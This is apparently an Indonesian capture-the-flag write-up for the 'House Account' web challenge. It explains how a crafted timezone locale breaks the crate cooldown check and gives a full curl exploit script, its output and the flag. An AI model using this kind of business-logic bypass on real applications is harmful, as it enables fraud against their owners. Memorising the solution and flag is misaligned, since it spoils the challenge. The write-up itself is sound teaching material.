# House Account Writeup

## Challenge

Challenge **House Account** adalah aplikasi web berbentuk market atau kasir permainan. User dapat membuat akun, membuka crate untuk mendapatkan credit, memainkan game, dan membeli item di shop. Salah satu item yang dapat dibeli adalah `flag`.

Target challenge ini adalah mendapatkan credit yang cukup untuk membeli item `flag`.

Berdasarkan source code, konfigurasi credit dan harga item adalah sebagai berikut:

```javascript id="y2j9if"
export const startingCredits = 5;
export const flagPrice = 670;
export const cratePayout = 95;
export const crateCooldownMs = 60 * 60 * 1000;
```

Artinya, setiap akun baru memiliki saldo awal `5`, sedangkan flag membutuhkan `670` credit. Crate memberikan `95` credit, tetapi normalnya hanya bisa dibuka setiap 1 jam.

## Source Code Review

Endpoint untuk membuka crate terdapat pada route berikut:

```javascript id="e1lnve"
router.post("/crate", requireSession, (req, res) => {
  const cooldown = getCooldownState({ lastCrateAt: req.session.user.lastCrateAt });
  if (!cooldown.canOpen) {
    const minutes = Math.ceil(cooldown.remainingMs / 60000);
    setFlash(res, "error", `The crate runner is not due back for another ${minutes} minute(s).`);
    return res.redirect("/#crate");
  }

  openCrate(req.session.user.id, req.session.cachedTimeZone);
  setFlash(res, "success", `You cracked open a ${crateName} and found ${cratePayout}Ⱡ inside.`);
  return res.redirect("/#crate");
});
```

Cooldown crate dihitung dari `lastCrateAt` milik user. Jika cooldown belum selesai, user tidak boleh membuka crate lagi.

Fungsi pengecekan cooldown ada di `cooldown.js`:

```javascript id="z9303f"
export function rebuildCrateCooldown(lastCrateAt) {
  if (!lastCrateAt) {
    return 0;
  }

  const lastOpenedAt = new Date(lastCrateAt);
  const nextOpenedAt = new Date(lastOpenedAt);
  nextOpenedAt.setMilliseconds(nextOpenedAt.getMilliseconds() + crateCooldownMs);
  return +nextOpenedAt || 0;
}
```

Bagian pentingnya ada pada:

```javascript id="ky2pki"
const lastOpenedAt = new Date(lastCrateAt);
```

Jika nilai `lastCrateAt` tidak bisa diparse oleh `new Date()`, maka hasil waktunya menjadi invalid. Pada bagian akhir fungsi, terdapat fallback:

```javascript id="sreev1"
return +nextOpenedAt || 0;
```

Jika `nextOpenedAt` invalid, maka `+nextOpenedAt` menjadi `NaN`, lalu dikembalikan sebagai `0`.

Akibatnya, cooldown dianggap sudah selesai karena `nextAt = 0`.

## Analisis Kerentanan

Aplikasi menyimpan waktu terakhir crate dibuka melalui fungsi berikut:

```javascript id="fvoy3m"
export function openCrate(userId, cachedTimeZone) {
  const user = getUserById(userId);
  const lastCrateAt = formatCrateTimestamp(new Date(), cachedTimeZone);
  const nextBalance = user.balance + cratePayout;

  db.prepare(`
    UPDATE users
    SET balance = ?, crate_label = ?
    WHERE id = ?
  `).run(nextBalance, lastCrateAt, userId);

  addLedgerEntry(userId, "crate", cratePayout, `Opened a ${crateName}.`);
  return getUserById(userId);
}
```

Nilai `cachedTimeZone` berasal dari profile user. Pada endpoint `/profile`, user bebas mengirim nilai `timeZone` selama panjangnya tidak lebih dari 64 karakter:

```javascript id="jvcmyy"
router.post("/profile", requireSession, (req, res) => {
  const username = (req.body.username ?? "").trim();
  const timeZone = (req.body.timeZone ?? defaultTimeZone).trim() || defaultTimeZone;

  if (!username || username.length > 20) {
    setFlash(res, "error", "Keep the account name between 1 and 20 characters.");
    return res.redirect("/?profile=1");
  }

  if (timeZone.length > 64) {
    setFlash(res, "error", "Keep the region tag under 64 characters.");
    return res.redirect("/?profile=1");
  }

  updateProfile(req.session.user.id, {
    username,
    timezoneLabel: timeZone,
  });
});
```

Tidak ada validasi bahwa `timeZone` harus berasal dari daftar timezone yang aman.

Di `cooldown.js`, proses format timestamp adalah sebagai berikut:

```javascript id="k7rxvv"
export function formatCrateTimestamp(date, timeZone = defaultTimeZone) {
  try {
    return formatWithTimeZone(date, timeZone);
  } catch {
    try {
      return formatWithLocaleFallback(date, timeZone);
    } catch {
      return formatWithTimeZone(date, defaultTimeZone);
    }
  }
}
```

Jika `timeZone` tidak valid sebagai timezone untuk `Intl.DateTimeFormat`, program masuk ke fallback:

```javascript id="ue0396"
function formatWithLocaleFallback(date, timeZone) {
  return date.toLocaleString(timeZone, {
    hour12: false,
  });
}
```

Masalahnya, parameter pertama `toLocaleString()` adalah locale, bukan timezone. Jadi, apabila kita mengirim `timeZone=id-ID`, nilai tersebut dianggap sebagai locale Indonesia.

Format tanggal dari locale `id-ID` dapat menjadi seperti:

```text id="p2dxsb"
1/8/2026, 14.39.51
```

Format ini tidak cocok untuk diparse kembali oleh JavaScript `new Date(...)`. Akibatnya, ketika cooldown dicek, `new Date(lastCrateAt)` menjadi invalid, lalu fungsi `rebuildCrateCooldown()` mengembalikan `0`.

Dengan kondisi tersebut, crate bisa dibuka berkali-kali tanpa menunggu 1 jam.

## Exploit Plan

Langkah exploit:

1. Register akun baru.
2. Update profile dengan `timeZone=id-ID`.
3. Login ulang agar session baru menyimpan `cachedTimeZone=id-ID`.
4. Buka crate sebanyak 7 kali.
5. Beli item `flag`.

Kenapa crate dibuka 7 kali?

```text id="2ua9ui"
saldo awal = 5
crate payout = 95
harga flag = 670
```

Perhitungannya:

```text id="g3m6n3"
5 + (7 × 95) = 670
```

Jadi setelah membuka crate 7 kali, saldo tepat cukup untuk membeli flag.

## Exploit Command

```bash id="m61gry"
BASE='https://http-01kyy3xyjvpjk0xf8m13khjk5t.u-ctf-ctf-7001b39a.urc.tf'
JAR=/tmp/house_cookie.txt
USER="n$(openssl rand -hex 5)"
PASS="bebas123"

rm -f "$JAR"

echo "[+] user: $USER"

echo "[+] register"
curl -ski -c "$JAR" -b "$JAR" \
  "$BASE/register" \
  --data-urlencode "username=$USER" \
  --data-urlencode "password=$PASS" \
  | head

echo "[+] set timezone bypass"
curl -ski -c "$JAR" -b "$JAR" \
  "$BASE/profile" \
  --data-urlencode "username=$USER" \
  --data-urlencode "timeZone=id-ID" \
  | head

echo "[+] login ulang supaya session cache id-ID"
curl -ski -c "$JAR" -b "$JAR" \
  "$BASE/login" \
  --data-urlencode "username=$USER" \
  --data-urlencode "password=$PASS" \
  | head

echo "[+] open crate 7x"
for i in $(seq 1 7); do
  echo "crate $i"
  curl -ski -c "$JAR" -b "$JAR" \
    "$BASE/crate" \
    --data "" \
    | grep -E 'HTTP/|location:|set-cookie:' -i
done

echo "[+] buy flag"
curl -sk -c "$JAR" -b "$JAR" \
  "$BASE/buy-item" \
  --data-urlencode "itemId=flag" \
| tee /tmp/house_result.html \
| grep -oE 'uctf\{[^}]+\}'
```

## Output

Saat script dijalankan, setiap request ke `/crate` berhasil dan server memberikan pesan bahwa crate berisi `95Ⱡ`.

Contoh output:

```text id="no04hv"
crate 1
You cracked open a scrap crate and found 95Ⱡ inside.
crate 2
You cracked open a scrap crate and found 95Ⱡ inside.
...
crate 7
You cracked open a scrap crate and found 95Ⱡ inside.
```

Setelah itu, item `flag` berhasil dibeli dan flag muncul:

```text id="aimb4b"
uctf{27798c80874201dd928c1d783a5173fceec8}
```

## Flag

```text id="p8gi40"
uctf{27798c80874201dd928c1d783a5173fceec8}
```

